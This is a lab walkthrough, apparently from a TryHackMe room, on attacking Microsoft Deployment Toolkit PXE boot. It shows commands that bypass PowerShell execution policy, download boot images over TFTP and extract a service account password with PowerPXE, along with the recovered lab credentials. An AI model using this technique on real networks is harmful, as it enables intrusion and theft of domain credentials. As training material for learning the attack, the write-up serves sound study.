# Microsoft Deployment Toolkit

Large organisations need tools to deploy and manage the infrastructure of the estate. In massive organisations, you 
can't have your IT personnel running around with DVDs or USB Flash for installing software on every single machine. 

Microsoft Deployment Toolkit (MDT) is used to deploy operating systems over the network using PXE boot; SCCM is used 
to manage hosts after they've been provisioned. Both of these technologies have the advantage of being a centralised 
management system for hosts. And, they also represent a massive attack surface.

If an attacker can pretend to be a PXE booting client on the network and request an image from MDT via a DHCP 
request, then the attacker could inject or scrape information from the PXE image during and after the setup process.

SSH into the jump host with password `Password1@`:

    ssh thm@THMJMP1.za.tryhackme.com

Create a working directory for the session using your username and copy the `powerpxe` directory into it:

    powershell -ep bypass
    mkdir Barzh
    cd Barzh
    cp -Recurse C:\powerpxe .

Go to `http://pxeboot.za.tryhackme.com/` Pretend to be a PXE client sending a DHCP request and receiving a list of 
BCD files for configuration. Copy the file name.

Use TFTP to connect to the MDT server and retrieve the BCD file and scrape it for credentials:

    tftp -i (Resolve-DnsName thmmdt.za.tryhackme.com).IPAddress GET "\Tmp\x64{BFA810B9-DF7D-401C-B5B6-2F4D37258344}.bcd" conf.bcd

Now have downloaded the BCD file and copied the powerpxe folder. Get the location of the WIM file, the Windows 
bootable image.

```text
Import-Module .\powerpxe\PowerPXE.ps1
$bcdfile = "conf.bcd"
Get-WimFile -bcdFile $bcdfile

>> Parse the BCD file: conf.bcd 
>>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim 
\Boot\x64\Images\LiteTouchPE_x64.wim
```

We know the path to download the image:

```text
$wimfile = '\Boot\x64\Images\LiteTouchPE_x64.wim'
$mdtserver = (Resolve-DnsName thmmdt.za.tryhackme.com).IPAddress
tftp -i $mdtserver GEt "$wimfile" pxeboot.wim

Transfer successful: 341899611 bytes in 277 second(s), 1234294 bytes/s
```

Scrape the image for credentials:

    Get-FindCredentials -WimFile .\pxeboot.wim
    
    >>>> Finding Bootstrap.ini 
    >>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$ 
    >>>> >>>> UserID = svcMDT
    >>>> >>>> UserDomain = ZA
    >>>> >>>> UserPassword = PXEBootSecure1@ 